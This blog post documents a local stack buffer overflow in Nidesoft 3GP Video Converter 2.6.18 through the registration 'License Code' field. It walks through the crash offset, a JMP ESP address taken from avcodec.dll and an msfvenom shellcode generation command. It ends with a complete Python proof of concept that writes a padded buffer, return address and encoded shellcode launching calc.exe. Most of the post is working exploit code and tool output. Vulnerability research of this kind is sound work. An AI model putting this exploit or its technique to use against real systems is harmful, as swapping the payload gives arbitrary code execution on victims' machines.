---
layout: post
title: Nidesoft 3GP Video Converter 2.6.18 - Local Stack Buffer Overflow
date: 2020-04-21 23:22:00
categories: posts
comments: false
en: true
---

 Nidesoft 3GP Video Converter 2.6.18 suffers from a Vanilla Stack Buffer Overflow when a long string is parsed through the parameter "License" within the Registration.
 
 Initial PoC:
 
 ```term
 import struct

buffer = "A" * 5000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
 ```
 
Once the exploit is run, the payload is copied into the clipboard.
In order to exploit the application, simply launch it, and the registration will appear. After such event is produced, simply paste the clipboard into the paramter "License Code", and click "OK" on the box that appears later on.

![](/assets/img/Findings12/1.png)

![](/assets/img/Findings12/3.png)


![](/assets/img/Findings12/4.png)

#### Crash I

![](/assets/img/Findings12/5.png)

After finding the pattern, which is 4592, we are off to find a JMP ESP address that is friendly towards the parameter of the application. Note that others instructions such as CALL ESP or PUSH ESP, RET can be used.

![](/assets/img/Findings12/6.png)

As seen on the image, there are several modules that could be from great help. However, the best to my view is avcodec.dll, as it has a friendly base address and most protections disabled.

Looking for a friendly JMP ESP address on avcodec.dll.

![](/assets/img/Findings12/7.png)

There are multiple addresses, I'll use 0x66C34867.

Current PoC:

```term
import struct

jmpesp = struct.pack("<I", 0x66C34867)

buffer = "A" * 4592 + jmpesp + "\xff" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

#### Crash II

![](/assets/img/Findings12/8.png)

Good, execution was achieved as intended, due to the reason that the EIP stopped at the FF bytes.

#### Generating shellcode

```term
root@whitecr0wz:~# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 448 (iteration=0)
x86/alpha_mixed chosen with final size 448
Payload size: 448 bytes
Final size of py file: 2188 bytes
buf =  b""
buf += b"\x89\xe1\xd9\xf7\xd9\x71\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x4d\x38\x6d"
buf += b"\x52\x47\x70\x63\x30\x55\x50\x53\x50\x4d\x59\x59\x75"
buf += b"\x56\x51\x4b\x70\x35\x34\x4e\x6b\x42\x70\x30\x30\x4c"
buf += b"\x4b\x43\x62\x66\x6c\x4c\x4b\x66\x32\x67\x64\x4e\x6b"
buf += b"\x34\x32\x45\x78\x46\x6f\x6e\x57\x63\x7a\x56\x46\x34"
buf += b"\x71\x39\x6f\x6e\x4c\x47\x4c\x73\x51\x73\x4c\x45\x52"
buf += b"\x36\x4c\x51\x30\x49\x51\x58\x4f\x66\x6d\x66\x61\x5a"
buf += b"\x67\x78\x62\x4a\x52\x56\x32\x63\x67\x6c\x4b\x51\x42"
buf += b"\x72\x30\x6e\x6b\x71\x5a\x47\x4c\x4c\x4b\x72\x6c\x74"
buf += b"\x51\x30\x78\x58\x63\x62\x68\x75\x51\x58\x51\x36\x31"
buf += b"\x4c\x4b\x33\x69\x65\x70\x56\x61\x6e\x33\x4e\x6b\x42"
buf += b"\x69\x42\x38\x69\x73\x45\x6a\x71\x59\x4c\x4b\x34\x74"
buf += b"\x6e\x6b\x36\x61\x6a\x76\x54\x71\x69\x6f\x6e\x4c\x59"
buf += b"\x51\x68\x4f\x64\x4d\x45\x51\x48\x47\x70\x38\x6b\x50"
buf += b"\x53\x45\x4b\x46\x47\x73\x33\x4d\x58\x78\x57\x4b\x33"
buf += b"\x4d\x71\x34\x32\x55\x39\x74\x52\x78\x6e\x6b\x73\x68"
buf += b"\x44\x64\x65\x51\x49\x43\x43\x56\x4c\x4b\x46\x6c\x70"
buf += b"\x4b\x6e\x6b\x50\x58\x67\x6c\x45\x51\x68\x53\x4c\x4b"
buf += b"\x44\x44\x6e\x6b\x57\x71\x4e\x30\x4e\x69\x51\x54\x74"
buf += b"\x64\x31\x34\x63\x6b\x33\x6b\x45\x31\x56\x39\x50\x5a"
buf += b"\x70\x51\x79\x6f\x79\x70\x61\x4f\x61\x4f\x63\x6a\x4c"
buf += b"\x4b\x37\x62\x6a\x4b\x4e\x6d\x51\x4d\x50\x6a\x43\x31"
buf += b"\x6c\x4d\x4f\x75\x68\x32\x75\x50\x53\x30\x75\x50\x56"
buf += b"\x30\x70\x68\x35\x61\x4e\x6b\x70\x6f\x4b\x37\x49\x6f"
buf += b"\x59\x45\x6d\x6b\x6b\x50\x65\x4d\x66\x4a\x64\x4a\x61"
buf += b"\x78\x49\x36\x6e\x75\x4f\x4d\x6f\x6d\x39\x6f\x59\x45"
buf += b"\x75\x6c\x55\x56\x33\x4c\x66\x6a\x4f\x70\x4b\x4b\x49"
buf += b"\x70\x42\x55\x54\x45\x6f\x4b\x57\x37\x37\x63\x51\x62"
buf += b"\x62\x4f\x50\x6a\x43\x30\x71\x43\x6b\x4f\x39\x45\x35"
buf += b"\x33\x71\x71\x42\x4c\x75\x33\x36\x4e\x65\x35\x62\x58"
buf += b"\x62\x45\x53\x30\x41\x41"
root@whitecr0wz:~# 
```

Final PoC:

```term
import struct

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
# Payload size: 448 bytes

buf =  b""
buf += b"\x89\xe1\xd9\xf7\xd9\x71\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x4d\x38\x6d"
buf += b"\x52\x47\x70\x63\x30\x55\x50\x53\x50\x4d\x59\x59\x75"
buf += b"\x56\x51\x4b\x70\x35\x34\x4e\x6b\x42\x70\x30\x30\x4c"
buf += b"\x4b\x43\x62\x66\x6c\x4c\x4b\x66\x32\x67\x64\x4e\x6b"
buf += b"\x34\x32\x45\x78\x46\x6f\x6e\x57\x63\x7a\x56\x46\x34"
buf += b"\x71\x39\x6f\x6e\x4c\x47\x4c\x73\x51\x73\x4c\x45\x52"
buf += b"\x36\x4c\x51\x30\x49\x51\x58\x4f\x66\x6d\x66\x61\x5a"
buf += b"\x67\x78\x62\x4a\x52\x56\x32\x63\x67\x6c\x4b\x51\x42"
buf += b"\x72\x30\x6e\x6b\x71\x5a\x47\x4c\x4c\x4b\x72\x6c\x74"
buf += b"\x51\x30\x78\x58\x63\x62\x68\x75\x51\x58\x51\x36\x31"
buf += b"\x4c\x4b\x33\x69\x65\x70\x56\x61\x6e\x33\x4e\x6b\x42"
buf += b"\x69\x42\x38\x69\x73\x45\x6a\x71\x59\x4c\x4b\x34\x74"
buf += b"\x6e\x6b\x36\x61\x6a\x76\x54\x71\x69\x6f\x6e\x4c\x59"
buf += b"\x51\x68\x4f\x64\x4d\x45\x51\x48\x47\x70\x38\x6b\x50"
buf += b"\x53\x45\x4b\x46\x47\x73\x33\x4d\x58\x78\x57\x4b\x33"
buf += b"\x4d\x71\x34\x32\x55\x39\x74\x52\x78\x6e\x6b\x73\x68"
buf += b"\x44\x64\x65\x51\x49\x43\x43\x56\x4c\x4b\x46\x6c\x70"
buf += b"\x4b\x6e\x6b\x50\x58\x67\x6c\x45\x51\x68\x53\x4c\x4b"
buf += b"\x44\x44\x6e\x6b\x57\x71\x4e\x30\x4e\x69\x51\x54\x74"
buf += b"\x64\x31\x34\x63\x6b\x33\x6b\x45\x31\x56\x39\x50\x5a"
buf += b"\x70\x51\x79\x6f\x79\x70\x61\x4f\x61\x4f\x63\x6a\x4c"
buf += b"\x4b\x37\x62\x6a\x4b\x4e\x6d\x51\x4d\x50\x6a\x43\x31"
buf += b"\x6c\x4d\x4f\x75\x68\x32\x75\x50\x53\x30\x75\x50\x56"
buf += b"\x30\x70\x68\x35\x61\x4e\x6b\x70\x6f\x4b\x37\x49\x6f"
buf += b"\x59\x45\x6d\x6b\x6b\x50\x65\x4d\x66\x4a\x64\x4a\x61"
buf += b"\x78\x49\x36\x6e\x75\x4f\x4d\x6f\x6d\x39\x6f\x59\x45"
buf += b"\x75\x6c\x55\x56\x33\x4c\x66\x6a\x4f\x70\x4b\x4b\x49"
buf += b"\x70\x42\x55\x54\x45\x6f\x4b\x57\x37\x37\x63\x51\x62"
buf += b"\x62\x4f\x50\x6a\x43\x30\x71\x43\x6b\x4f\x39\x45\x35"
buf += b"\x33\x71\x71\x42\x4c\x75\x33\x36\x4e\x65\x35\x62\x58"
buf += b"\x62\x45\x53\x30\x41\x41"

jmpesp = struct.pack("<I", 0x66C34867)

buffer = "A" * 4592 + jmpesp + "A" * 10 + buf + "\xff" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

### EndGame

![](/assets/img/Findings12/9.gif)
